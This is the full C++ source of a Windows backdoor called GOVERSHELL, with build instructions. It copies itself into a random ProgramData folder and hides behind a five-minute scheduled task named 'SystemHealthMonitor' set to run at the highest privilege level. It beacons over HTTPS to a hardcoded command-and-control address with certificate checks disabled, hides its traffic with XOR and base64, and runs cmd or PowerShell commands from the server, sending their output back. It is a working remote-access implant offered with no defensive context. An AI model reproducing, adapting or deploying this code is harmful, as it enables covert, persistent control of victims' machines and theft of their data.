// Compile: x86_64-w64-mingw32-g++ -std=c++17 -o  GOVERSHELL.exe  GOVERSHELL.cpp -static -lwinhttp -lws2_32 -lgdi32 -mwindows -lole32 -loleaut32

// Execution: GOVERSHELL.exe -SilentChollima

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <chrono>
#include <thread>
#include <random>
#include <ctime>
#include <sstream>
#include <algorithm>
#include <cctype>
#include <shlobj.h>
#include <fstream>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

const std::string SERVER_HOST = "192.168.1.8";
const DWORD SERVER_PORT = 465;
const bool VERIFY_SSL = false;
const std::string AUTH_ID = "227e1e1b-9b2d-4fdd-9229-fd828efec8f9";
const uint8_t XOR_KEY = 11;

const std::string RUN_ARG = "-SilentChollima";

const std::string INITIAL_CHECKIN_PATH = "/";

std::string CURRENT_USER_AGENT = "Mozilla/5.0";
double start_jitter = 0.0;
double end_jitter = 0.0;
double jitter_delay = 0.0;

std::string uri_tasks;
std::string uri_submit;
std::string uri_health;
std::string persist_dir;
std::string full_exe_path;

namespace base64 {
    static const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    std::string encode(const std::vector<uint8_t>& data) {
        std::string ret;
        int val = 0, valb = -6;
        for (uint8_t c : data) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                ret.push_back(chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) ret.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
        while (ret.size() % 4) ret.push_back('=');
        return ret;
    }

    std::vector<uint8_t> decode(const std::string& data) {
        std::vector<uint8_t> ret;
        int val = 0, valb = -8;
        for (char c : data) {
            if (c == '=') break;
            size_t pos = chars.find(c);
            if (pos == std::string::npos) continue;
            val = (val << 6) + pos;
            valb += 6;
            if (valb >= 0) {
                ret.push_back((val >> valb) & 0xFF);
                valb -= 8;
            }
        }
        return ret;
    }
}

std::string xor_crypt(const std::string& input, uint8_t key) {
    std::string output = input;
    for (char& c : output) c ^= key;
    return output;
}

std::string xor_encrypt(const std::string& plain) {
    std::string xored = xor_crypt(plain, XOR_KEY);
    return base64::encode(std::vector<uint8_t>(xored.begin(), xored.end()));
}

std::string xor_decrypt(const std::string& encrypted_b64) {
    std::vector<uint8_t> xored = base64::decode(encrypted_b64);
    std::string xored_str(xored.begin(), xored.end());
    return xor_crypt(xored_str, XOR_KEY);
}

std::vector<uint8_t> string_to_vector(const std::string& str) {
    return std::vector<uint8_t>(str.begin(), str.end());
}

std::string generate_random_dir() {
    const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, chars.size() - 1);
    std::string dir_name;
    for (int i = 0; i < 8; ++i) {
        dir_name += chars[dis(gen)];
    }
    return dir_name;
}

std::string get_module_path() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return std::string(path);
}

bool create_persistence_dir() {
    CHAR program_data[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, program_data))) {
        persist_dir = std::string(program_data) + "\\" + generate_random_dir();
        return CreateDirectoryA(persist_dir.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
    }
    return false;
}

bool copy_to_persistence() {
    full_exe_path = persist_dir + "\\ GOVERSHELL.exe";
    std::ifstream src(get_module_path(), std::ios::binary);
    if (!src) return false;
    std::ofstream dst(full_exe_path, std::ios::binary);
    if (!dst) return false;
    dst << src.rdbuf();
    return dst.good();
}

// Persistence
bool create_scheduled_task() {
    std::string quoted_path = "\"" + full_exe_path + "\"";
    std::string cmd = "schtasks.exe /Create /TN \"SystemHealthMonitor\" /TR \"" + quoted_path + " " + RUN_ARG + "\" /SC MINUTE /MO 5 /F /RL HIGHEST";

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char cmd_line[4096];
    strncpy(cmd_line, cmd.c_str(), sizeof(cmd_line) - 1);
    cmd_line[sizeof(cmd_line) - 1] = '\0';

    BOOL success = CreateProcessA(NULL, cmd_line, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (success) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    return false;
}

bool setup_persistence() {
    if (!create_persistence_dir()) return false;
    if (!copy_to_persistence()) return false;
    return create_scheduled_task();
}

bool has_run_argument() {
    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argv) return false;

    bool has_run = false;
    for (int i = 1; i < argc; ++i) {
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, argv[i], -1, NULL, 0, NULL, NULL);
        if (size_needed <= 0) continue;
        std::string arg(size_needed - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, argv[i], -1, &arg[0], size_needed, NULL, NULL);
        if (arg == RUN_ARG) {
            has_run = true;
            break;
        }
    }

    LocalFree(argv);
    return has_run;
}

std::vector<uint8_t> execute_command(const std::string& command) {
    bool use_powershell = (command.length() >= 2 && command.substr(0, 2) == "EP");
    std::string cmd_to_execute = use_powershell ? command.substr(2) : command;

    if (use_powershell) {
        cmd_to_execute.erase(0, cmd_to_execute.find_first_not_of(" \t\r\n"));
        cmd_to_execute.erase(cmd_to_execute.find_last_not_of(" \t\r\n") + 1);
    }

    if (use_powershell && cmd_to_execute.empty()) {
        return string_to_vector("Empty or invalid PowerShell command");
    }

    if (use_powershell) {
        std::string escaped_cmd;
        for (char c : cmd_to_execute) {
            if (c == '"') escaped_cmd += "\\\"";
            else escaped_cmd += c;
        }
        cmd_to_execute = escaped_cmd;
    }

    std::string full_command = use_powershell
        ? "powershell.exe -NoProfile -NonInteractive -Command \"" + cmd_to_execute + "\""
        : "cmd.exe /c " + cmd_to_execute;

    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr;
    HANDLE hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) {
        return string_to_vector("Failed to create pipe");
    }
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    std::vector<char> cmd_line(full_command.begin(), full_command.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        CloseHandle(hStdoutRd);
        return string_to_vector("Failed to create process");
    }

    std::string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    return string_to_vector(result);
}

std::string http_request(const std::string& method, const std::string& path, const std::string& body = "") {
    std::wstring wserver = std::wstring(SERVER_HOST.begin(), SERVER_HOST.end());
    std::wstring wpath = std::wstring(path.begin(), path.end());
    std::wstring wua = std::wstring(CURRENT_USER_AGENT.begin(), CURRENT_USER_AGENT.end());

    HINTERNET hSession = WinHttpOpen(wua.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "Error: WinHttpOpen";

    HINTERNET hConnect = WinHttpConnect(hSession, wserver.c_str(), SERVER_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return "Error: WinHttpConnect";
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
                                            method == "POST" ? L"POST" : L"GET",
                                            wpath.c_str(),
                                            NULL,
                                            WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "Error: WinHttpOpenRequest";
    }

    if (!VERIFY_SSL) {
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    std::wstring headers = L"Content-Type: application/json\r\n";
    BOOL sendResult = WinHttpSendRequest(hRequest,
                                         headers.c_str(),
                                         headers.length(),
                                         body.empty() ? WINHTTP_NO_REQUEST_DATA : (LPVOID)body.c_str(),
                                         body.length(),
                                         body.length(),
                                         0);
    if (!sendResult) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "Error: SendRequest failed";
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "Error: ReceiveResponse failed";
    }

    std::string response;
    DWORD bytesAvailable, bytesRead;
    std::vector<char> buffer(8192);
    while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
        WinHttpReadData(hRequest, buffer.data(), std::min(bytesAvailable, (DWORD)buffer.size()), &bytesRead);
        response.append(buffer.data(), bytesRead);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return response;
}

std::string get_json_value(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos += search.length();

    while (pos < json.length() && std::isspace(static_cast<unsigned char>(json[pos]))) pos++;
    if (pos >= json.length()) return "";

    bool is_string = (json[pos] == '"');
    if (is_string) pos++;

    size_t end = is_string ? json.find('"', pos) : json.find_first_of(",}]", pos);
    if (end == std::string::npos) end = json.length();

    return json.substr(pos, end - pos);
}

void run() {
    std::random_device rd;
    std::mt19937 gen(rd());

    while (true) {
        try {

            std::string test_token = xor_encrypt(AUTH_ID);
            std::string body = "{\"test_token\":\"" + test_token + "\"}";
            std::string resp = http_request("POST", INITIAL_CHECKIN_PATH, body);


            if (resp.find("error") != std::string::npos ||
                resp.find("Invalid") != std::string::npos ||
                resp.find("403") != std::string::npos ||
                resp.empty()) {
                std::this_thread::sleep_for(std::chrono::seconds(10));
                continue;
            }


            std::string enc_session_id   = get_json_value(resp, "session_id");
            std::string enc_user_agent   = get_json_value(resp, "user_agent");
            std::string enc_start        = get_json_value(resp, "start_jitter");
            std::string enc_end          = get_json_value(resp, "end_jitter");
            std::string enc_delay        = get_json_value(resp, "jitter_delay");
            std::string enc_uri_tasks    = get_json_value(resp, "uri_tasks");
            std::string enc_uri_submit   = get_json_value(resp, "uri_submit");
            std::string enc_uri_health   = get_json_value(resp, "uri_health");


            if (enc_session_id.empty() || enc_uri_tasks.empty() ||
                enc_uri_submit.empty() || enc_uri_health.empty()) {
                std::this_thread::sleep_for(std::chrono::seconds(10));
                continue;
            }

            std::string session_id = xor_decrypt(enc_session_id);


            if (!enc_user_agent.empty()) {
                CURRENT_USER_AGENT = xor_decrypt(enc_user_agent);
            }


            try {
                if (!enc_start.empty()) start_jitter = std::stod(xor_decrypt(enc_start));
                if (!enc_end.empty())   end_jitter   = std::stod(xor_decrypt(enc_end));
                if (!enc_delay.empty()) jitter_delay = std::stod(xor_decrypt(enc_delay));
            } catch (...) {
                start_jitter = 0.0;
                end_jitter   = 0.0;
                jitter_delay = 0.0;
            }


            uri_tasks  = xor_decrypt(enc_uri_tasks);
            uri_submit = xor_decrypt(enc_uri_submit);
            uri_health = xor_decrypt(enc_uri_health);


            while (true) {
                // Heartbeat
                std::string hb_body = "{\"session_id\":\"" + xor_encrypt(session_id) + "\"}";
                http_request("POST", uri_health, hb_body);

                // Get Task
                std::string task_resp = http_request("GET", uri_tasks + "?session_id=" + xor_encrypt(session_id));
                std::string enc_command = get_json_value(task_resp, "command");

                if (enc_command.empty() || enc_command == "\"\"") {
                    std::uniform_real_distribution<> dis(start_jitter, end_jitter);
                    std::this_thread::sleep_for(std::chrono::milliseconds(static_cast<int>((jitter_delay + dis(gen)) * 1000)));
                    continue;
                }

                std::string command = xor_decrypt(enc_command);
                if (command.empty()) continue;

                std::vector<uint8_t> output_vec = execute_command(command);
                std::string output(output_vec.begin(), output_vec.end());
                std::string enc_output = xor_encrypt(output);

                std::string out_body = "{\"session_id\":\"" + xor_encrypt(session_id) + "\",\"output\":\"" + enc_output + "\"}";
                http_request("POST", uri_submit, out_body);

                // Jitter
                std::uniform_real_distribution<> dis(start_jitter, end_jitter);
                std::this_thread::sleep_for(std::chrono::milliseconds(static_cast<int>((jitter_delay + dis(gen)) * 1000)));
            }
        }
        catch (...) {
            std::this_thread::sleep_for(std::chrono::seconds(10));
        }
    }
}

int main() {
    if (!has_run_argument()) {
        setup_persistence();
        return 0;
    }

    srand(static_cast<unsigned>(time(nullptr)));
    run();
    return 0;
}
